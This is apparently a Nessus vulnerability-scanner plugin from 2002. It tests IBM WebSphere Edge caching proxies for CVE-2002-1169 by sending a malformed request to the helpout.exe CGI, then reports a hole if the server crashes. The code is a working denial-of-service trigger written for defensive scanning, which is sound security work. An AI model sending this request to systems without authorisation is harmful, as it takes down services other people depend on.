#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
########################
# References:
########################
# From:"Rapid 7 Security Advisories" <advisory@rapid7.com>
# Message-ID: <OF0A5563E4.CA3D8582-ON85256C5B.0068EEBC-88256C5B.0068BF86@hq.rapid7.com>
# Date: Wed, 23 Oct 2002 12:08:39 -0700
# Subject: R7-0007: IBM WebSphere Edge Server Caching Proxy Denial of Service
#
########################

if(description)
{
 script_id(11162);
 script_bugtraq_id(6002);
 script_version("$Revision: 1.14 $");
 script_cve_id("CVE-2002-1169");
  
 name["english"] = "WebSphere Edge caching proxy denial of service";
 script_name(english:name["english"]);
 
 desc["english"] = "
We could crash the WebSphere Edge caching proxy by sending a 
bad request to the helpout.exe CGI

Risk factor : High

Solution : Upgrade your web server or remove this CGI.";

 script_description(english:desc["english"]);
 
 summary["english"] = "crashes the remote proxy";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) || http_is_dead(port: port)) exit(0);

foreach dir (cgi_dirs())
{
 p = string(dir, "/helpout.exe");
 soc = http_open_socket(port);
 if (! soc) exit(0);	# Bug?

 req = string("GET ", p, " HTTP\r\n\r\n");
 send(socket:soc, data:req);
 http_close_socket(soc);
 if(http_is_dead(port: port))
 {
  security_hole(port);
  exit(0);
 }
}
